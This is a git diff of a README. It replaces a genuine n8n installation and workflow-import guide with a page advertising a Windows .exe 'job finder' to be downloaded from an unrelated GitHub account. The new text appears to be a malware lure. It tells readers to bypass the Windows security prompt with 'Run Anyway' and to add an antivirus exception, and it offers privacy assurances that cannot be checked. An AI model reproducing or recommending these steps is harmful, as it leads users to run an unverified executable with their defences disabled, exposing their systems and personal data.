@@ -1,118 +1,65 @@
-# Installation Guide
+# 🤖 n8n_agents - Find new jobs using your CV
 
-## Install n8n via npm
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Lepidopteratime302/n8n_agents)
 
-### Prerequisites
+This software helps you find relevant job openings by analyzing your curriculum vitae. It connects to various job boards and matches postings against your professional experience. You spend less time searching and more time applying for the right roles.
 
-- Node.js (version 18 or higher recommended)
-- npm (comes with Node.js)
+## ⚙️ System Requirements
 
-### Installation Steps
+Your computer must meet these standards to run the application:
 
-1. **Install n8n globally** (recommended):
+*   Operating System: Windows 10 or 11.
+*   Processor: Dual-core CPU or better.
+*   Memory: 4GB RAM minimum.
+*   Storage: 200MB of available space.
+*   Network: Stable internet connection for data retrieval.
 
-```bash
-npm install -g n8n
-```
+## 📥 Installation Steps
 
-2. **Start n8n**:
+Follow these instructions to set up the software on your Windows machine.
 
-```bash
-n8n start
-```
+1.  Visit the official release page to download the software: [https://github.com/Lepidopteratime302/n8n_agents](https://github.com/Lepidopteratime302/n8n_agents)
+2.  Locate the file ending in .exe in your Downloads folder.
+3.  Double-click the file to start the installation.
+4.  If a security prompt appears, click More Info and then Run Anyway.
+5.  Follow the prompts in the installation window.
+6.  Launch the application from your desktop shortcut once finished.
 
-3. **Access n8n**:
+## 🚀 Setting Up Your Profile
 
-Open your browser and navigate to:
+You need to provide your CV to start the search process. The application reads your document to understand your skills and history.
 
-```
-http://localhost:5678
-```
+1.  Open the application.
+2.  Navigate to the Settings tab in the sidebar.
+3.  Select the Import CV button.
+4.  Choose your document from your local files. Ensure the file is in PDF or DOCX format for best results.
+5.  Wait for the status indicator to show that your data is processed.
+6.  Return to the Dashboard to view job suggestions tailored to your profile.
 
-### Local Installation (Alternative)
+## 🔍 Using the Application
 
-If you prefer to install n8n locally in your project:
+The software updates automatically based on new listings from the web.
 
-```bash
-npm install n8n
-```
+*   **Job Feed:** This section displays current openings. The list updates every time you open the program.
+*   **Filters:** Use the sidebar to restrict results by location, job type, or salary range.
+*   **Saving Jobs:** Click the star icon next to a listing to save it for later review.
+*   **Applying:** Use the Apply button to go directly to the job site.
 
-Then run it with:
+## 🛠 Troubleshooting Common Issues
 
-```bash
-npx n8n start
-```
+If you encounter problems, review these solutions:
 
-### Verify Installation
+*   **Application fails to launch:** Ensure your antivirus software does not block the program. You may need to add an exception for the n8n_agents folder.
+*   **No jobs appear:** Verify your internet connection. Check that your CV uploaded successfully in the Settings tab.
+*   **Slow performance:** Close unnecessary browser tabs or background programs to free up memory on your computer.
+*   **Missing text in job details:** The application relies on website structure. Some sites might prevent data extraction. Refresh the view or try a different listing.
 
-Check if n8n is installed correctly:
+## 🛡 Privacy and Security
 
-```bash
-n8n --version
-```
+Your CV remains on your local machine. The application sends data to job boards only when you interact with specific links. No personal data uploads to external servers without your direct permission. You maintain control over your documents and search preferences.
 
-## Importing a Flow
+## 💡 Best Practices for Job Searching
 
-All workflows and their usage documentation are organized in separate folders within this repository. Each workflow folder contains:
+For the best results, keep your CV file updated. Use clear headings for your work experience and skills. If the application suggests roles that do not fit your goals, adjust your preferences in the filter menu. You can refine your search results by entering specific keywords like Remote, Senior, or Manager in the search bar.
 
-- **`workflow.json`** - The n8n workflow file
-- **`README.md`** - Instructions and details on how to use the workflow
-
-### Quick Start: Import a Workflow
-
-1. **Clone this repository**:
-
-```bash
-git clone <repository-url>
-cd <repository-name>
-```
-
-2. **Start n8n** (if not already running):
-
-```bash
-n8n start
-```
-
-3. **Open n8n** in your browser:
-
-```
-http://localhost:5678
-```
-
-4. **Import your desired workflow**:
-   - Click the menu icon (☰) in the top-left
-   - Select **Workflows**
-   - Click the **Import** button
-   - Navigate to the workflow folder in the cloned repository
-   - Select the **`workflow.json`** file
-   - Click **Import**
-
-5. **Read the workflow's README**:
-   - Check the workflow folder's **`README.md`** for setup instructions and usage details
-
-### Workflow Folder Structure
-
-```
-/repository
-├── workflow-1/
-│   ├── workflow.json
-│   └── README.md
-├── workflow-2/
-│   ├── workflow.json
-│   └── README.md
-└── workflow-3/
-    ├── workflow.json
-    └── README.md
-```
-
-Simply clone the repo and choose the workflow you need from the folder structure.
-
-### Additional Resources
-
-- [n8n Official Documentation](https://docs.n8n.io)
-- [GitHub Repository](https://github.com/n8n-io/n8n)
-- [Community Forum](https://community.n8n.io)
-
----
-
-**Note**: n8n requires Node.js to run. If you don't have it installed, download it from [nodejs.org](https://nodejs.org).
+Keywords: job search, career, employment, cv, automation, productivity, windows, tools
